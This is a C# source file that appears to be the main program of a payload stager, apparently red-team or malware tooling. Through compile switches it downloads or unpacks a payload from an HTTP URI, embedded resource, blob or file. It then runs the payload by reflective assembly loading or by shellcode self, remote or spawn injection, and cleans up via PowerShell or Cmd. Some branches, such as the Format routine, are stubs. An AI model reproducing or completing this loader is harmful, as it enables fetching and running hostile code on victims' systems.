//-------------------- Test
//--- Compile Type
//#define DEBUG
//#define EXE
// Checks
#define Checks_None // for now
//--- Get Staged
//#define HttpUri
//#define WebSocketUri
//#define QUICUri
//--- Get Stageless
//#define Resource
//#define Blob
//#define File
//--- Format
//#define Base64
//#define Aes256
//#define Aes128
//--- Execute
//#define ExecuteAssembly
//#define Shellcode_SelfInject
//#define Shellcode_RemoteInject
//#define Shellcode_SpawnInject
//#define DllExported_RemoteInject
//--- CleanUp
//#define PowerShell
//#define Cmd
//--------------------

using MB1.Modules;
using MB1.Helpers;
using MB1.Checks;
using System;
using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Runtime.Remoting.Lifetime;

namespace MB1
{
    internal static class Program
    {
#if EXE
        private static void Main(string[] args)
#else
        public static void StartW()
#endif
        {
            // Load Dependencies from embedded resources
            AppDomain.CurrentDomain.AssemblyResolve += (sender, arr) => {

                string resourceName = Settings.SharedArsenal;
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    Console.WriteLine($"[*] Loading Resource: {resourceName}");
                    Byte[] assemblyData = new Byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };

            // Checks
#if !Checks_None
            if (Modules.Check.PerformChecks())
            {
                CleanUp(); // Jump to CleanUp
            }
#endif

            // Get
            byte[] data = null;
            bool result = Get(out data);

            if (!result || data == null || data.Length == 0)
            {
                data = null;
                WriteDebug.Error("Failed to get payload");
                CleanUp();
            }

            WriteDebug.Info($"Data Length: {data.Length}");

            // Format
#if Base64 || Aes256 || Aes128
            result = Format(out data);
#else
            WriteDebug.Info($"Format None");
#endif

            if (!result || data == null || data.Length == 0)
            {
                data = null;
                WriteDebug.Error("Failed to format payload");
                CleanUp();
            }

            WriteDebug.Info($"Data Length: {data.Length}");

            // Execute
            result = Execute(ref data); // data set to null here

            if (!result)
            {
                data = null;
                WriteDebug.Error("Failed to execute payload");
                CleanUp();
            }

            // CleanUp 
            CleanUp();
        }

        private static bool Get(out byte[] data)
        {
            bool result = false;
            data = null;

#if HttpUri
            string uri = Settings.HttpUri;
            WriteDebug.Info($"Get HttpUri: {uri}");
            result = Modules.Get.Download(out data, uri);
#elif WebSocketUri
            WriteDebug.Info($"Get WebSocketUri");
#elif Resource
            string resourceName = Settings.Resource;
            WriteDebug.Info($"Get Resource {resourceName}");
            result = Modules.Get.EmbeddedResource(out data, resourceName);
#elif Blob
            string blob = Settings.Blob;
            WriteDebug.Info($"Get Blob");
            data = Format.DecodeBase64(blob);
            if (data != null) result = true;
#elif File
            string file = Settings.File;
            WriteDebug.Info($"Get File {file}");
            result = Modules.Get.ReadFromDisk(out data, file);
#endif
            return result;
        }

        private static bool Format(out byte[] data)
        {
            bool result = false;

#if Base64
WriteDebug.Info($"Format Base64");
#elif Aes256
WriteDebug.Info($"Format Aes256");
#elif Aes128
WriteDebug.Info($"Format Aes128");
#else
            data = null;
#endif

            return result;
        }

        private static bool Execute(ref byte[] data)
        {
            bool result = false;

#if ExecuteAssembly
            string[] arguments = new string[] { };
            WriteDebug.Info("Execute execute assembly");
            result = Modules.Execute.Reflection(data, arguments);
#elif Shellcode_SelfInject
            string[] arguments = new string[] { };
            WriteDebug.Info("Execute Shellcode Self Inject");
            result = Modules.Execute.ShellcodeSelfInject(data, arguments);
#elif Shellcode_RemoteInject
            string[] arguments = new string[] { };
            WriteDebug.Info("Execute Shellcode Remote Inject");
            result = Modules.Execute.ShellcodeRemoteInject(data, arguments);
#elif Shellcode_SpawnInject
            string[] arguments = new string[] { };
            WriteDebug.Info("Execute Shellcode Spawn Inject");
            result = Modules.Execute.ShellcodeSpawnInject(data, arguments);
#elif DllExportedRemoteInject
WriteDebug.Info("Execute DllExported Remote Inject");
#endif
            data = null; // set data to null after
            return result;
        }


        private static void CleanUp()
        {
            WriteDebug.Info("Press Enter to continue to CleanUp...");
            Console.ReadLine();

#if PowerShell
            WriteDebug.Info($"CleanUp PowerShell");
            Modules.CleanUp.PowerShell();

#elif Cmd
            WriteDebug.Info($"CleanUp Cmd");
            Modules.CleanUp.CommandPrompt();
#endif
            WriteDebug.Info($"CleanUp None");
            System.Environment.Exit(0);
        }

#if DEBUG
        private static void Exit()
        {
            System.Environment.Exit(1);
        }
#endif
    }
}